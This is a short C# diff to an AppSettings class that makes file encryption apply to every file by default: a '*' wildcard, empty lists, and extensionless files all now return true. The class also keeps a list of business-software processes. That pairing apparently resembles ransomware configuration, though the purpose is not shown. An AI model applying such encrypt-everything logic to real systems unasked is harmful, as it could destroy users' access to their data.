@@ -8,7 +8,7 @@ public sealed class AppSettings
 
     public string LogFormatName { get; set; } = "json";
 
-    public List<string> EncryptedExtensions { get; set; } = [];
+    public List<string> EncryptedExtensions { get; set; } = ["*"];
 
     public List<string> BusinessSoftwareProcesses { get; set; } = [];
 
@@ -22,13 +22,20 @@ public sealed class AppSettings
 
     public bool ShouldEncrypt(string filePath)
     {
+        var normalizedExtensions = GetNormalizedEncryptedExtensions();
+        if (normalizedExtensions.Count == 0 ||
+            normalizedExtensions.Contains("*", StringComparer.OrdinalIgnoreCase))
+        {
+            return true;
+        }
+
         var extension = Path.GetExtension(filePath);
         if (string.IsNullOrWhiteSpace(extension))
         {
-            return false;
+            return true;
         }
 
-        return GetNormalizedEncryptedExtensions()
+        return normalizedExtensions
             .Contains(extension, StringComparer.OrdinalIgnoreCase);
     }
 
@@ -37,7 +44,8 @@ public sealed class AppSettings
         return EncryptedExtensions
             .Where(value => !string.IsNullOrWhiteSpace(value))
             .Select(value => value.Trim())
-            .Select(value => value.StartsWith('.') ? value : $".{value}")
+            .Select(value => value is "*" or "*.*" or ".*" ? "*" : value)
+            .Select(value => value == "*" || value.StartsWith('.') ? value : $".{value}")
             .Distinct(StringComparer.OrdinalIgnoreCase)
             .ToList();
     }
